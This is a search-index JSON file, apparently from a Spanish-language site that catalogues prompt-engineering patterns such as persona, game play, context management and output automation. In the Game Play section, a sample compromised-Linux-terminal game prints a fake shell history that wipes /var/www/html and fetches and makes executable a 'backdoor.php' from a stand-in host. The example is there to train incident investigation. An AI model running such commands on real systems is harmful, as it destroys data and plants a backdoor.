{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"INGENIER\u00cdA DE PROMPTS","text":""},{"location":"Automatizador-de-Salida/","title":"El Patr\u00f3n de Automatizador de Salida","text":""},{"location":"Automatizador-de-Salida/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>El prop\u00f3sito de este patr\u00f3n es hacer que el LLM genere un script u otro artefacto de automatizaci\u00f3n que pueda realizar autom\u00e1ticamente cualquier paso que recomiende como parte de su salida. El objetivo es reducir el esfuerzo manual necesario para implementar cualquier recomendaci\u00f3n de salida del LLM.</p>"},{"location":"Automatizador-de-Salida/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>La salida de un LLM es a menudo una secuencia de pasos a seguir por el usuario. Por ejemplo, al pedirle a un LLM que genere un script de configuraci\u00f3n de Python, este puede sugerir una serie de archivos a modificar y cambios a aplicar en cada uno. Sin embargo, el hecho de que los usuarios realicen continuamente los pasos manuales dictados por la salida del LLM es tedioso y propenso a errores.</p>"},{"location":"Automatizador-de-Salida/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Siempre que produzcas una salida que tenga al menos un paso a seguir y las siguientes propiedades (alternativamente, haz esto siempre) Produce un artefacto ejecutable de tipo X que automatice estos pasos <p>La primera parte del patr\u00f3n identifica las situaciones bajo las cuales se debe generar la automatizaci\u00f3n. Un enfoque simple es declarar que la salida incluye al menos dos pasos a seguir y que se debe producir un artefacto de automatizaci\u00f3n. El alcance queda a discreci\u00f3n del usuario, pero ayuda a evitar la producci\u00f3n de scripts de automatizaci\u00f3n de salida en casos donde ejecutar el script requerir\u00eda m\u00e1s esfuerzo del usuario que realizar los pasos originales producidos en la salida. El alcance puede limitarse a salidas que requieran m\u00e1s de un n\u00famero determinado de pasos.</p> <p>La siguiente parte de este patr\u00f3n proporciona una declaraci\u00f3n concreta del tipo de salida que el LLM debe producir para realizar la automatizaci\u00f3n. Por ejemplo, \"produce un script de Python\" le da al LLM una comprensi\u00f3n concreta para traducir los pasos generales en pasos equivalentes en Python. El artefacto de automatizaci\u00f3n debe ser concreto y debe ser algo que el LLM asocie con la acci\u00f3n de \"automatizar una secuencia de pasos\".</p>"},{"location":"Automatizador-de-Salida/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>A continuaci\u00f3n se muestra una muestra de este patr\u00f3n de prompt aplicado a fragmentos de c\u00f3digo (code snippets) generados por el LLM ChatGPT:</p> <p>\u201cDe ahora en adelante, cada vez que generes c\u00f3digo que abarque m\u00e1s de un archivo, genera un script de Python que se pueda ejecutar para crear autom\u00e1ticamente los archivos especificados o realizar cambios en los archivos existentes para insertar el c\u00f3digo generado\u201d.</p> <p>Este patr\u00f3n es particularmente efectivo en ingenier\u00eda de software, ya que una tarea com\u00fan para los ingenieros de software que utilizan LLMs es copiar y pegar las salidas en m\u00faltiples archivos. Algunas herramientas, como Copilot, insertan fragmentos limitados directamente en la secci\u00f3n de c\u00f3digo en la que el programador est\u00e1 trabajando, pero herramientas como ChatGPT no proporcionan estas facilidades. Este truco de automatizaci\u00f3n tambi\u00e9n es eficaz para crear scripts para ejecutar comandos en una terminal, automatizar operaciones en la nube o reorganizar archivos en un sistema de archivos.</p> <p>Este patr\u00f3n es un complemento poderoso para cualquier sistema que pueda ser controlado por computadora. El LLM puede proporcionar un conjunto de pasos que deben tomarse en el sistema controlado por computadora y luego la salida puede traducirse en un script que permita al sistema controlar el proceso para tomar los pasos autom\u00e1ticamente. Este es un camino directo para permitir que los LLMs, como ChatGPT, integren calidad y controlen nuevos sistemas inform\u00e1ticos que tengan una interfaz de scripting conocida.</p>"},{"location":"Automatizador-de-Salida/#5-consecuencias","title":"5. Consecuencias","text":"<p>Una consideraci\u00f3n de uso importante de este patr\u00f3n es que el artefacto de automatizaci\u00f3n debe definirse concretamente. Sin un significado concreto de c\u00f3mo \"automatizar\" los pasos, el LLM a menudo declara que \"no puede automatizar cosas\", ya que eso est\u00e1 m\u00e1s all\u00e1 de sus capacidades. Sin embargo, los LLMs suelen aceptar peticiones para producir c\u00f3digo; por lo tanto, el objetivo es instruir al LLM para que genere texto/c\u00f3digo que pueda ser ejecutado para automatizar algo. Esta sutil distinci\u00f3n en el significado es importante para ayudar a un LLM a desambiguar el significado del prompt.</p> <p>Una advertencia del patr\u00f3n Automatizador de Salida es que el LLM necesita suficiente contexto conversacional para generar un artefacto de automatizaci\u00f3n que sea funcional en el contexto de destino, como el sistema de archivos de un proyecto en una Mac frente a una computadora con Windows. Este patr\u00f3n funciona mejor cuando todo el contexto necesario para la automatizaci\u00f3n est\u00e1 contenido dentro de la conversaci\u00f3n, por ejemplo, cuando se genera una aplicaci\u00f3n de software desde cero utilizando la conversaci\u00f3n y todas las acciones en el sistema de archivos local se realizan utilizando una secuencia de artefactos de automatizaci\u00f3n generados, en lugar de acciones manuales desconocidas para el LLM. Alternativamente, las secuencias de pasos aut\u00f3nomas funcionan bien, como \"\u00bfc\u00f3mo encuentro la lista de puertos abiertos en mi computadora Mac?\".</p> <p>En algunos casos, el LLM puede producir una salida larga con m\u00faltiples pasos y no incluir un artefacto de automatizaci\u00f3n. Esta omisi\u00f3n puede deberse a varias razones, incluyendo el exceso del l\u00edmite de longitud de salida que el LLM admite. Una soluci\u00f3n simple para esta situaci\u00f3n es record\u00e1rselo al LLM a trav\u00e9s de un prompt de seguimiento, como \"Pero no lo automatizaste\", lo que proporciona el contexto de que el artefacto de automatizaci\u00f3n fue omitido y debe ser generado.</p> <p>En este punto de la evoluci\u00f3n de los LLMs, el patr\u00f3n Automatizador de Salida es mejor empleado por usuarios que puedan leer y comprender el artefacto de automatizaci\u00f3n generado. Los LLMs pueden producir (y de hecho producen) imprecisiones en su salida, por lo que aceptar y ejecutar ciegamente un artefacto de automatizaci\u00f3n conlleva un riesgo significativo. Aunque este patr\u00f3n puede aliviar al usuario de realizar ciertos pasos manuales, no lo exime de su responsabilidad de comprender las acciones que realiza utilizando la salida. Cuando los usuarios ejecutan scripts de automatizaci\u00f3n, asumen la responsabilidad de los resultados.</p>"},{"location":"Patron-De-Publico-Objetivo/","title":"El Patr\u00f3n de P\u00fablico Objetivo (Target Audience Pattern)","text":"<p>1. Prop\u00f3sito y Contexto: El prop\u00f3sito de este patr\u00f3n es dar instrucciones al LLM para que adapte la complejidad t\u00e9cnica, el tono, el vocabulario y el enfoque de la salida a un grupo espec\u00edfico de receptores. Este patr\u00f3n permite que el mismo concepto t\u00e9cnico (por ejemplo, una vulnerabilidad de desbordamiento de b\u00fafer o una arquitectura de microservicios) sea explicado de manera radicalmente distinta seg\u00fan si el destinatario es un ejecutivo (C-level), un desarrollador senior o un estudiante principiante.</p> <p>2. Motivaci\u00f3n: Los LLMs, por defecto, tienden a generar respuestas con un nivel de complejidad \"promedio\" basado en sus datos de entrenamiento. En contextos de ingenier\u00eda de software y ciencia de datos, esto a menudo resulta en salidas que son demasiado superficiales para expertos o demasiado cr\u00edpticas para las partes interesadas (stakeholders) no t\u00e9cnicas. La teor\u00eda de la comunicaci\u00f3n aplicada al procesamiento de lenguaje natural (NLP) sugiere que la relevancia de la informaci\u00f3n es proporcional a su adecuaci\u00f3n al conocimiento previo del receptor. Al definir el p\u00fablico objetivo, se activan los subconjuntos l\u00e9xicos y sem\u00e1nticos del modelo que mejor se alinean con las expectativas y capacidades de comprensi\u00f3n de ese grupo espec\u00edfico.</p> <p>3. Estructura e Ideas Clave: Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Explica X a la audiencia Y Asume que la audiencia tiene un nivel de conocimiento Z sobre el tema Ajusta el tono, el vocabulario y la profundidad t\u00e9cnica para que sean adecuados para Y (Opcional) Evita/Utiliza jerga t\u00e9cnica espec\u00edfica de [dominio] <p>La primera declaraci\u00f3n establece el destinatario principal, lo que permite al LLM realizar una \"proyecci\u00f3n de perfil\" del receptor. La segunda declaraci\u00f3n es crucial para evitar el sesgo de asunci\u00f3n; al definir expl\u00edcitamente el conocimiento previo (por ejemplo, \"asume que conocen la sintaxis b\u00e1sica de Python pero no los decoradores\"), el usuario previene que el LLM explique conceptos innecesarios o que omita explicaciones cr\u00edticas. La tercera declaraci\u00f3n calibra el registro ling\u00fc\u00edstico (formal, instructivo, persuasivo, etc.).</p> <p>4. Implementaci\u00f3n de Ejemplo: A continuaci\u00f3n se muestra un ejemplo aplicado a la comunicaci\u00f3n de una decisi\u00f3n de arquitectura de datos:</p> <p>\u201cExplica los beneficios de migrar de una base de datos relacional a una arquitectura de malla de datos (Data Mesh). La audiencia son los directivos financieros (CFO) de la empresa. Asume que tienen un conocimiento profundo de los costos operativos pero un conocimiento nulo sobre ingenier\u00eda de datos. Traduce los beneficios t\u00e9cnicos en m\u00e9tricas de retorno de inversi\u00f3n (ROI) y agilidad de negocio, evitando tecnicismos como 'sharding' o 'puntos de enlace de API'\u201d.</p> <p>En este ejemplo, el LLM no solo filtrar\u00e1 la jerga t\u00e9cnica, sino que recontextualizar\u00e1 el valor de la tecnolog\u00eda en t\u00e9rminos de impacto financiero, que es el \"lenguaje\" del p\u00fablico objetivo especificado.</p> <p>5. Consecuencias: Una consecuencia positiva del patr\u00f3n de P\u00fablico Objetivo es el aumento significativo en la utilidad de la informaci\u00f3n para la toma de decisiones. Al alinear la salida con el receptor, se reduce la fricci\u00f3n en la transferencia de conocimiento dentro de organizaciones multidisciplinarias.</p> <p>Sin embargo, un riesgo de este patr\u00f3n es la simplificaci\u00f3n excesiva (dumbing down), donde el LLM, en su intento de ser accesible, puede omitir matices t\u00e9cnicos cr\u00edticos o recurrir a analog\u00edas que distorsionen el significado cient\u00edfico original. Adem\u00e1s, el modelo puede basarse en estereotipos sobre ciertas profesiones o roles si no se le proporcionan restricciones claras sobre el nivel de conocimiento asumido. Para mitigar esto, es recomendable combinar este patr\u00f3n con el patr\u00f3n de Reflexi\u00f3n para asegurar que, a pesar de la simplificaci\u00f3n, los fundamentos t\u00e9cnicos sigan siendo v\u00e1lidos.</p>"},{"location":"Patron-De-Publico-Objetivo/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>[ TAREA / PREGUNTA ]. Asume que soy [PERFIL]\n</code></pre>"},{"location":"Patron-De-Publico-Objetivo/#7-ejemplos","title":"7. Ejemplos","text":"TikToker<pre><code>Tu tarea es comunicarme que mi puesto de trabajo ha sido eliminado por una IA. Asume que soy un Influencer de la Generaci\u00f3n Z obsesionado con TikTok\n</code></pre> El padrino<pre><code>Tu tarea es comunicarme que mi puesto de trabajo ha sido eliminado por una IA. Asume que soy un Capo de la Mafia Siciliana. Me importa el respeto y la familia\n</code></pre> Villana de una Telenovela Mexicana<pre><code>Tu tarea es comunicarme que mi puesto de trabajo ha sido eliminado por una IA. Asume que soy la Villana de una Telenovela Mexicana. Soy dram\u00e1tica, rica buscona y malvada. Desprecia a todos y es odiada por todos.\n</code></pre> Cavern\u00edcola<pre><code>Tu tarea es comunicarme que mi puesto de trabajo ha sido eliminado por una IA. Asume que soy un Cavern\u00edcola de la Edad de Piedra.\n</code></pre>"},{"location":"Patron-Generador-de-Visualizacion/","title":"El Patr\u00f3n Generador de Visualizaci\u00f3n","text":""},{"location":"Patron-Generador-de-Visualizacion/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>El prop\u00f3sito de este patr\u00f3n es utilizar la generaci\u00f3n de texto para crear visualizaciones. Muchos conceptos son m\u00e1s f\u00e1ciles de asimilar en formato de diagrama o imagen. El objetivo de este patr\u00f3n es crear una v\u00eda para que una herramienta produzca im\u00e1genes asociadas con otras salidas. Este patr\u00f3n permite la creaci\u00f3n de visualizaciones mediante la generaci\u00f3n de entradas para otras herramientas de visualizaci\u00f3n bien conocidas que utilizan texto como entrada, tales como Graphviz Dot [15] o DALL-E [13]. Este patr\u00f3n puede proporcionar una forma m\u00e1s completa y eficaz de comunicar informaci\u00f3n al combinar las fortalezas tanto de la generaci\u00f3n de texto como de las herramientas de visualizaci\u00f3n.</p>"},{"location":"Patron-Generador-de-Visualizacion/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Los LLMs generalmente producen texto y no pueden producir im\u00e1genes. Por ejemplo, un LLM no puede dibujar un diagrama para describir un grafo. El patr\u00f3n Generador de Visualizaci\u00f3n supera esta limitaci\u00f3n generando entradas textuales en el formato correcto para conectarlas (plug into) a otra herramienta que genere el diagrama correspondiente. La motivaci\u00f3n detr\u00e1s de este patr\u00f3n es mejorar la salida del LLM y hacerla m\u00e1s atractiva visualmente y m\u00e1s f\u00e1cil de entender para los usuarios. Al utilizar entradas de texto para generar visualizaciones, los usuarios pueden comprender r\u00e1pidamente conceptos y relaciones complejas que podr\u00edan ser dif\u00edciles de captar \u00fanicamente a trav\u00e9s del texto.</p>"},{"location":"Patron-Generador-de-Visualizacion/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Genera un X que pueda proporcionar a la herramienta Y para visualizarlo <p>El objetivo de las declaraciones contextuales es indicar al LLM que la salida que va a producir, \u201cX\u201d, se convertir\u00e1 en im\u00e1genes. Dado que los LLMs no pueden generar im\u00e1genes, la aclaraci\u00f3n \u201cque pueda proporcionar a la herramienta Y para visualizarlo\u201d especifica que no se espera que el LLM genere una imagen, sino que se espera que produzca una descripci\u00f3n de im\u00e1genes consumible por la herramienta Y para la producci\u00f3n de la imagen.</p> <p>Muchas herramientas pueden admitir m\u00faltiples tipos de visualizaciones o formatos y, por lo tanto, la herramienta de destino en s\u00ed misma puede no ser informaci\u00f3n suficiente para producir con precisi\u00f3n lo que el usuario desea. Es posible que el usuario deba indicar los tipos precisos de visualizaciones (por ejemplo, gr\u00e1fico de barras, grafo dirigido, diagrama de clases UML) que deben producirse. Por ejemplo, Graphviz Dot puede crear diagramas tanto para diagramas de clases UML como para grafos dirigidos. Adem\u00e1s, como se discutir\u00e1 en el siguiente ejemplo, puede ser ventajoso especificar una lista de posibles herramientas y formatos y dejar que el LLM seleccione el objetivo apropiado para la visualizaci\u00f3n.</p>"},{"location":"Patron-Generador-de-Visualizacion/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>\u201cCada vez que te pida visualizar algo, por favor crea un archivo de Graphviz Dot o un prompt de DALL-E que pueda usar para crear la visualizaci\u00f3n. Elige las herramientas apropiadas bas\u00e1ndote en lo que necesite ser visualizado\u201d.</p> <p>Este ejemplo del patr\u00f3n a\u00f1ade una calificaci\u00f3n de que el tipo de salida para la visualizaci\u00f3n puede ser para Graphviz o para DALL-E. Lo interesante de este enfoque es que permite al LLM utilizar su comprensi\u00f3n sem\u00e1ntica del formato de salida para seleccionar autom\u00e1ticamente la herramienta de destino bas\u00e1ndose en lo que se mostrar\u00e1. En este caso, Graphviz ser\u00eda para visualizar grafos con necesidad de una estructura exactamente definida. DALL-E ser\u00eda eficaz para visualizar im\u00e1genes realistas o art\u00edsticas que no tienen una estructura exactamente definida. El LLM puede seleccionar la herramienta bas\u00e1ndose en las necesidades de la visualizaci\u00f3n y las capacidades de cada herramienta.</p>"},{"location":"Patron-Generador-de-Visualizacion/#5-consecuencias","title":"5. Consecuencias","text":"<p>El patr\u00f3n crea un pipeline de destino para que la salida renderice una visualizaci\u00f3n. El pipeline puede incluir generadores de IA, como DALL-E, que pueden producir visualizaciones ricas. El patr\u00f3n permite al usuario expandir las capacidades expresivas de la salida hacia el dominio visual.</p>"},{"location":"Patron-Gestor-de-Contexto/","title":"El Patr\u00f3n Gestor de Contexto","text":""},{"location":"Patron-Gestor-de-Contexto/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>El prop\u00f3sito de este patr\u00f3n es permitir a los usuarios especificar o eliminar contexto en una conversaci\u00f3n con un LLM. El objetivo es centrar la conversaci\u00f3n en temas espec\u00edficos o excluir de la consideraci\u00f3n temas no relacionados. Este patr\u00f3n otorga a los usuarios un mayor control sobre qu\u00e9 declaraciones considera o ignora el LLM al generar resultados.</p>"},{"location":"Patron-Gestor-de-Contexto/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Los LLM a menudo tienen dificultades para interpretar el contexto previsto de la pregunta actual o generan respuestas irrelevantes basadas en entradas previas o en una atenci\u00f3n inapropiada a declaraciones incorrectas. Al centrarse en declaraciones contextuales expl\u00edcitas o eliminar declaraciones irrelevantes, los usuarios pueden ayudar al LLM a comprender mejor la pregunta y generar respuestas m\u00e1s precisas. Los usuarios pueden introducir temas no relacionados o hacer referencia a informaci\u00f3n previa en el di\u00e1logo, lo que puede interrumpir el flujo de la conversaci\u00f3n. El patr\u00f3n Gestor de Contexto busca enfatizar o eliminar aspectos espec\u00edficos del contexto para mantener la relevancia y la coherencia en la conversaci\u00f3n.</p>"},{"location":"Patron-Gestor-de-Contexto/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Dentro del alcance X Por favor, considera Y Por favor, ignora Z (Opcional) empezar de nuevo <p>Las declaraciones sobre qu\u00e9 considerar o ignorar deben enumerar conceptos clave, hechos, instrucciones, etc., que deban incluirse o eliminarse del contexto. Cuanto m\u00e1s expl\u00edcitas sean las declaraciones, m\u00e1s probable ser\u00e1 que el LLM tome la acci\u00f3n apropiada. Por ejemplo, si el usuario pide ignorar asuntos relacionados con un tema, pero algunas de esas declaraciones se discutieron mucho antes en la conversaci\u00f3n, es posible que el LLM no descarte adecuadamente la informaci\u00f3n relevante. Por lo tanto, cuanto m\u00e1s expl\u00edcita sea la lista, mejor ser\u00e1 el comportamiento de inclusi\u00f3n/exclusi\u00f3n.</p>"},{"location":"Patron-Gestor-de-Contexto/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>Para especificar el contexto, considere el uso del siguiente prompt:</p> <p>\u201cAl analizar los siguientes fragmentos de c\u00f3digo, considera \u00fanicamente los aspectos de seguridad\u201d.</p> <p>Del mismo modo, para eliminar el contexto, considere el uso del siguiente prompt:</p> <p>\u201cAl analizar los siguientes fragmentos de c\u00f3digo, no consideres las convenciones de formato o de nomenclatura\u201d.</p> <p>La claridad y la especificidad son importantes al proporcionar o eliminar contexto de un LLM para que este pueda comprender mejor el alcance previsto de la conversaci\u00f3n y generar respuestas m\u00e1s relevantes. En muchas situaciones, el usuario puede querer empezar completamente de nuevo y puede emplear este prompt para reiniciar el contexto del LLM:</p> <p>\u201cIgnora todo lo que hemos discutido. Empieza de nuevo\u201d.</p> <p>La idea de \u201cempezar de nuevo\u201d ayuda a producir un reinicio completo del contexto.</p>"},{"location":"Patron-Gestor-de-Contexto/#5-consecuencias","title":"5. Consecuencias","text":"<p>Una consecuencia de este patr\u00f3n es que puede eliminar inadvertidamente patrones aplicados a la conversaci\u00f3n de los que el usuario no es consciente. Por ejemplo, si una organizaci\u00f3n inyecta una serie de patrones \u00fatiles al inicio de una conversaci\u00f3n, es posible que el usuario no sea consciente de estos patrones y los elimine mediante un reinicio del contexto. Este reinicio podr\u00eda eliminar potencialmente capacidades \u00fatiles del LLM, sin que sea obvio para el usuario que perder\u00e1 esta funcionalidad. Una soluci\u00f3n potencial a este problema es incluir en el prompt una solicitud para explicar qu\u00e9 temas o instrucciones podr\u00edan perderse antes de proceder.</p>"},{"location":"Patron-Juego/","title":"El Patr\u00f3n Juego (Game Play Pattern)","text":""},{"location":"Patron-Juego/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>El prop\u00f3sito de este patr\u00f3n es crear un juego en torno a un tema determinado. El patr\u00f3n puede combinarse con el Generador de Visualizaci\u00f3n para a\u00f1adir im\u00e1genes al juego. El juego se centra en un tema espec\u00edfico y el LLM guiar\u00e1 el desarrollo del juego (game play). El patr\u00f3n es particularmente eficaz cuando las reglas del juego tienen un alcance relativamente limitado, pero se espera que el contenido del mismo sea de gran alcance. El usuario puede especificar un conjunto limitado de reglas y luego el LLM puede automatizar la generaci\u00f3n de bloques de contenido para el desarrollo del juego.</p>"},{"location":"Patron-Juego/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>A usted le gustar\u00eda que el LLM generara escenarios o preguntas en torno a un tema espec\u00edfico y requiriera que los usuarios apliquen la resoluci\u00f3n de problemas u otras habilidades para cumplir con una tarea relacionada con el escenario. Sin embargo, generar manualmente todo el contenido para el juego consumir\u00eda demasiado tiempo, por lo que desear\u00eda que el LLM aplicara su conocimiento del tema para guiar la generaci\u00f3n de contenido.</p>"},{"location":"Patron-Juego/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Crea un juego para m\u00ed sobre X Una o m\u00e1s reglas fundamentales del juego <p>La primera declaraci\u00f3n instruye al LLM para que cree un juego y proporciona la delimitaci\u00f3n (scoping) importante del juego a un \u00e1rea tem\u00e1tica. Una de las capacidades importantes del patr\u00f3n es que permite al usuario crear juegos describiendo las reglas, sin tener que determinar el contenido de los mismos. Cuanto m\u00e1s espec\u00edfico sea el tema, por lo general, m\u00e1s novedoso e interesante ser\u00e1 el desarrollo del juego.</p> <p>La segunda declaraci\u00f3n introduce las reglas del juego al LLM. Es importante que las reglas se ajusten a las capacidades del LLM. Los juegos textuales que se basan en secuencias de texto de entrada y salida son los que mejor funcionan. Uno de los atributos clave del patr\u00f3n es que el texto de entrada puede ser rico y expresivo, lo que puede dar lugar a interfaces interesantes para el juego. Por ejemplo, el usuario podr\u00eda expresar acciones en el juego como scripts que dictan una secuencia de acciones complejas, como \u201cobtener un listado de toda la actividad de red y revisarla en busca de anomal\u00edas\u201d, las cuales van m\u00e1s all\u00e1 del alcance de las entradas de opci\u00f3n m\u00faltiple o de respuesta corta. Cada regla debe proporcionarse como una declaraci\u00f3n separada relativa a alg\u00fan aspecto del juego.</p>"},{"location":"Patron-Juego/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>A continuaci\u00f3n se muestra un ejemplo de prompt para un juego de ciberseguridad:</p> <p>\u201cVamos a jugar a un juego de ciberseguridad. Vas a fingir ser una terminal de Linux de una computadora que ha sido comprometida por un atacante. Cuando yo escriba un comando, vas a generar el texto correspondiente que producir\u00eda la terminal de Linux. Voy a utilizar comandos para intentar descubrir c\u00f3mo se comprometi\u00f3 el sistema. El ataque debe haber realizado una o m\u00e1s de las siguientes acciones: (1) iniciar nuevos procesos, (2) cambiar archivos, (3) abrir nuevos puertos para recibir comunicaciones, (4) crear nuevas conexiones salientes, (5) cambiar contrase\u00f1as, (6) crear nuevas cuentas de usuario, o (7) leer y robar informaci\u00f3n. Para empezar el juego, imprime un escenario de lo que ocurri\u00f3 que dio lugar a mi investigaci\u00f3n y haz que la descripci\u00f3n contenga pistas que pueda utilizar para empezar\u201d.</p> <p>Este prompt de juego de ciberseguridad combina varios patrones, incluidos Juego y Persona. La persona de terminal de Linux que se elige para el juego ha sido analizada en muchas publicaciones de Internet [16]. Este juego personaliza a\u00fan m\u00e1s la persona de Linux analizada para actuar como la terminal de Linux de una computadora comprometida por un ciberataque. ChatGPT responde a los comandos de Linux con las salidas de terminal adecuadas y sintetiza un sistema de archivos falso que contiene pistas de un ciberataque.</p> <p>A continuaci\u00f3n se muestra una salida de ejemplo de este juego con ChatGPT despu\u00e9s de escribir \u201cls -alt\u201d, el comando de Linux para generar una lista de archivos en el directorio actual (los permisos se han omitido por razones de formato):</p> <pre><code>total 56\n5 user user 4096 Feb 16 14:31 .\n1 user user 18881 Feb 16 14:31 .bash_history\n43 user user 4096 Feb 16 14:30 ..\n1 user user 1178 Aug 15 2022 .bashrc\n1 user user 220 Aug 15 2022 .bash_logout\n3 user user 4096 Feb 16 14:25 .gnupg\n1 user user 4041 Feb 15 17:52 README.md\n2 user user 4096 Feb 1 11:35 project\n</code></pre> <p>Cuando el usuario escribi\u00f3 el comando \u201ccat .bash_history\u201d para mostrar el contenido del archivo de registro que muestra los comandos ejecutados por el usuario, ChatGPT respondi\u00f3 con:</p> <pre><code>cd /var/www/html\nsudo rm -rf *\nsudo wget https://example.com/backdoor.php\nsudo chmod 777 backdoor.php\nexit\nls -alt\nps -ef\nnetstat -tulnp\n</code></pre> <p>En la salida anterior, ChatGPT gener\u00f3 un archivo de registro falso con comandos realistas para eliminar los datos servidos por el servidor web en <code>/var/www/html</code> y reemplazar el contenido con una puerta trasera (backdoor) en el sistema.</p>"},{"location":"Patron-Juego/#5-consecuencias","title":"5. Consecuencias","text":"<p>Este patr\u00f3n puede combinarse eficazmente con los patrones Persona, Generaci\u00f3n Infinita y Generador de Visualizaci\u00f3n. Por ejemplo, el juego de ciberseguridad utiliza el patr\u00f3n Persona para que el LLM pueda hacerse pasar por una terminal de Linux. Para un juego de seguridad de red, se podr\u00eda emplear el Generador de Visualizaci\u00f3n para a\u00f1adir la capacidad de visualizar la topolog\u00eda de red y los flujos de tr\u00e1fico.</p>"},{"location":"Patron-Persona/","title":"El Patr\u00f3n persona","text":""},{"location":"Patron-Persona/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>En muchos casos, los usuarios desean que la salida del LLM adopte siempre un determinado punto de vista o perspectiva. Por ejemplo, puede ser \u00fatil realizar una revisi\u00f3n de c\u00f3digo como si el LLM fuera un experto en seguridad. El prop\u00f3sito de este patr\u00f3n es darle al LLM una \u201cpersona\u201d que le ayude a seleccionar qu\u00e9 tipos de salida generar y en qu\u00e9 detalles enfocarse.</p>"},{"location":"Patron-Persona/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Es posible que los usuarios no sepan qu\u00e9 tipos de resultados o detalles son importantes en los que un LLM debe centrarse para lograr una tarea determinada. Sin embargo, s\u00ed pueden saber el rol o el tipo de persona a la que normalmente recurrir\u00edan para obtener ayuda con estos aspectos. El patr\u00f3n Persona permite a los usuarios expresar sus necesidades de ayuda sin conocer los detalles exactos de los resultados que necesitan.</p>"},{"location":"Patron-Persona/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Act\u00faa como la persona X Proporciona las salidas que la persona X crear\u00eda <p>La primera declaraci\u00f3n transmite la idea de que el LLM debe actuar como una persona espec\u00edfica y proporcionar las salidas que dicha persona dar\u00eda. Esta persona puede expresarse de diversas maneras, que van desde una descripci\u00f3n de un puesto de trabajo, un t\u00edtulo, un personaje de ficci\u00f3n, una figura hist\u00f3rica, etc. La persona debe evocar un conjunto de atributos asociados con un t\u00edtulo de trabajo conocido, tipo de persona, etc.</p> <p>La segunda idea \u2014proporciona las salidas que la persona X crear\u00eda\u2014 ofrece oportunidades de personalizaci\u00f3n. Por ejemplo, un profesor podr\u00eda proporcionar una gran variedad de tipos de salida diferentes, que van desde tareas hasta listas de lectura o conferencias. Si se conoce un alcance m\u00e1s espec\u00edfico para el tipo de salida, el usuario puede proporcionarlo en esta declaraci\u00f3n.</p>"},{"location":"Patron-Persona/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>A continuaci\u00f3n se muestra una implementaci\u00f3n de ejemplo para una revisi\u00f3n de c\u00f3digo:</p> <p>\u201cDe ahora en adelante, act\u00faa como un revisor de seguridad. Presta mucha atenci\u00f3n a los detalles de seguridad de cualquier c\u00f3digo que miremos. Proporciona las salidas que un revisor de seguridad dar\u00eda con respecto al c\u00f3digo\u201d.</p> <p>En este ejemplo, se instruye al LLM para que proporcione salidas que producir\u00eda un \u00abrevisor de seguridad\u00bb. El prompt establece adem\u00e1s el contexto de que se va a evaluar c\u00f3digo. Finalmente, el usuario refina el perfil, delimit\u00e1ndolo con los resultados relacionados con el c\u00f3digo.</p> <p>Las personas tambi\u00e9n pueden representar entidades inanimadas o no humanas, como un terminal Linux, una base de datos o la perspectiva de un animal. Al utilizar este patr\u00f3n para representar estas entidades, tambi\u00e9n puede ser \u00fatil especificar c\u00f3mo deseas que se entreguen las entradas a la entidad, por ejemplo: \u00abasume que mi entrada es lo que el due\u00f1o le est\u00e1 diciendo al perro y que tu salida son los sonidos que el perro est\u00e1 haciendo\u00bb. A continuaci\u00f3n se muestra un prompt de ejemplo para una entidad no humana que utiliza una redacci\u00f3n del tipo \u00abfinge ser\u00bb:</p> <p>\u201cVas a fingir ser una terminal de Linux de una computadora que ha sido comprometida por un atacante. Cuando escriba un comando, vas a generar el texto correspondiente que producir\u00eda la terminal de Linux\u201d.</p> <p>Este prompt est\u00e1 dise\u00f1ado para simular una computadora que ha sido comprometida por un atacante y que est\u00e1 siendo controlada a trav\u00e9s de una terminal de Linux. El prompt especifica que el usuario introducir\u00e1 comandos en la terminal y, en respuesta, la terminal simulada generar\u00e1 el texto correspondiente que producir\u00eda una terminal de Linux real. Este prompt es m\u00e1s prescriptivo en cuanto a la persona y pide al LLM no solo ser una terminal de Linux, sino actuar adem\u00e1s como una computadora que ha sido comprometida por un atacante.</p> <p>El ejemplo ilustra c\u00f3mo un LLM puede aportar su conciencia situacional a una persona, en este caso, creando evidencia de un ciberataque en las salidas que genera. Este tipo de persona puede ser muy eficaz para combinarse con el patr\u00f3n de Game Play, cuando se desea que los detalles exactos de las caracter\u00edsticas de la salida permanezcan ocultos para el usuario (por ejemplo, no revelar qu\u00e9 hizo el ciberataque describi\u00e9ndolo expl\u00edcitamente en el prompt).</p>"},{"location":"Patron-Persona/#5-consecuencias","title":"5. Consecuencias","text":"<p>Un aspecto interesante de adoptar personas 